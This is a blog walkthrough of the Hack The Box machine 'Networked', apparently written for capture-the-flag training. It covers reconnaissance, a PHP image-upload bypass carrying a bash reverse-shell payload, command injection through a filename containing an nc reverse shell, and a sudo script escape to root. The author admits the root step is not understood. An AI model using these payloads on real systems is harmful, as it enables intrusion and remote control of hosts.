---
title: 'Hack The Box &#8211; Networked'
date: '2019-11-02T23:18:00-04:00'
categories:
    - 'Hack The Box'
tags:
    - hackthebox
---

Networked was an easy but very interesting box that left me confused at the end. I have not figured out why the final exploit worked but I plan on setting up an environment to find the reason it worked and update this page.

## Content

- Information
- Reconnaissance
- Initial Access & Execution
- User Privilege Escalation
- Root Privilege Escalation
- Data Exfiltration

## Information

- IP: 10.10.10.146
- OS: Linux

## Reconnaissance 

I ran map against the target running Nmap against the target, **-sC** to run Nmap scripts, and **-sV** for get service’s version running on port.

```
 root@kali:~/htb/boxes/networked# nmap -sC -sV -oA nmap/nmap_scan 10.10.10.146
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-31 21:03 EDT
 Nmap scan report for 10.10.10.146
 Host is up (0.077s latency).
 Not shown: 997 filtered ports
 PORT    STATE  SERVICE VERSION
 22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
...
 80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
 ...
 443/tcp closed https
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 31.81 seconds
```

I discovered port 22 open running SSH. I attempted to connect and try password guessing but it wasn’t fruitful. Port 443 is closed, which is interesting since a web server is installed on the host. I assume the creator of the box doesn’t want us to poke on that service just yet. The last port 80 is running a website. It appears to be a custom photo album web application.

![](/assets/images/2019/11/image-1.png)

Nothing of interest in the main page, so I proceeded to run **gobuster** against the website. **/Upload** and **/backup** directories are found. My initial curiosity lead me to backups.

```
root@kali:~/htb/boxes/networked/nmap# gobuster dir -u 10.10.10.146 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster_medium.txt
...
 /uploads (Status: 301)
 /backup (Status: 301)
```

In the **/backup** directory, I found a **tar** file that contained the source code for the web application. Nothing of interest was found in **index.php**. However, **lib.php** and **upload.php** a vulnerability in how the images are validated before being uploaded.

![](/assets/images/2019/11/image-1.tiff)
![](/assets/images/2019/11/image.tiff)

The file **lib.php** is a required include in **upload.php**. **upload.php** performs the check before images are uploaded into the application based on the following criteria: file size &lt; 60kb, filename extension must be jpg, gif, and a few other, and lastly it checks for that the file contains the magic bytes of known image formats. **Upload.php** provides a custom upload interface.

![](/assets/images/2019/11/image-3.png) 

## Initial Access & Execution

Photos.php includes any file in **/uploads** that is not **index.php**. I created a custom payload containing the magic bytes of the gif file format and appended code for a reverse shell. I created a file named **payload.php.jpg** with the following contents.

```
GIF89a;
<?php exec('bash -i >& /dev/tcp/10.10.15.154/8880 0>&1'); ?> 
```

Then I proceeded to upload the payload using **upload.php** file upload tool. I launched a new terminal console, ran netcat on listening mode, and then I clicked “go!”.

![](/assets/images/2019/11/image-4.png)

Next, I proceed to **photos.php** to view the photo album and have the server execute my payload.

![](/assets/images/2019/11/image-5.png)

Now I have obtain initial access and have a shell as apache user.

```
root@kali:~/htb/boxes/networked# nc -lvp 8880
 ...
 bash-4.2$ whoami
 apache
```

## User Privilege Escalation

I proceed to run **LinEnum.sh**, a great Linux enumeration script but nothing interesting is found since I am running as a limited user, **apache**. Apache had access to **/home/guly** directory. In the directory, I found two files of interest: **crontab.guly**, which runs **check\_attack.php** every 15 minutes as a cron job and runs as user guly. **check\_attack.php**. looks for files that have been uploaded into **/uploads** and doesn’t meet the requirements and then attempts to remove them. However, there is a vulnerability allows command execution when processing a file for deletion at:

```
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```

**$value** is not sanitized, and it can be escaped to run custom commands. I use the vulnerability to create a new shell as the owner of the script, guly. To exploit the vulnerability, I create a new file in **/uploads** that contains a netcat command in the filename.

```
 bash-4.2$ touch ;nc -c bash 10.10.15.154 8881;                            │
 touch ;nc -c bash 10.10.15.154 8881; 
```

![](/assets/images/2019/11/image-6.png)

I have a new limited shell as user, which I immediately upgraded to a tty shell by creating yet another reverse shell.

```
bash -i >& /dev/tcp/10.10.15.154/8882 0>&1
```

I ran **LinEnum.sh**, a great Linux enumeration script, and discovered a file that could possibly lead to privilege escalation. The same results could have been gathered with basic enumeration techniques.

```
 [guly@networked ~]$ sudo -l
 sudo -l
...
 User guly may run the following commands on networked:
     (root) NOPASSWD: /usr/local/sbin/changename.sh
```

## Root Privilege Escalation

The file **changeme.sh** is used to replace a network interface script at **/etc/sysconfig/network-scripts/ifcfg-guly** and runs as root. The script file prompts the users for four inputs. I managed to fuzz the application into giving me a root shell. However, I am not entirely sure why I was able to escape the loop and get a root shell. I think the flaw is in **while \[\[ ! $x =~ $regexp \]\]**;. Because the variable **$x** is not quoted, I am able to escape the loop by passing **-e /bin/bash** as an input and get a root shell.

## Data Exfiltration

```
 [root@networked ~]# cat root.txt                                                
 cat root.txt                                                                                         
 
```

If you know why **-e /bin/bash** was able to escape the loop, please drop a comment below.